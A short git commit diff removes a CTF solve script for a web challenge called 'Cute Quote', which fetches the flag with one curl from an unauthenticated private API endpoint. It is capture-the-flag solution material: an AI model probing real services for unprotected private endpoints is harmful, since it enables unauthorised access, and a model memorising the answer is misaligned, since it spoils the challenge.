d2680c094e4d0bfa189418a1a577250437cba1a0
nhannht <nhanclassroom@gmail.com>
2026-05-25 11:05:15 +0700

    Hide hcmusctf2026 workspace from public repo

--- hcmusctf2026/solve_Cute_Quote.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-# Solve: Cute Quote (Web - Easy)
-# The /api/private/flag endpoint returns the flag with NO authentication.
-# Just curl it.
-
-curl http://challenge-host:3000/api/private/flag
-
-# Expected output: HCMUS-CTF{...}
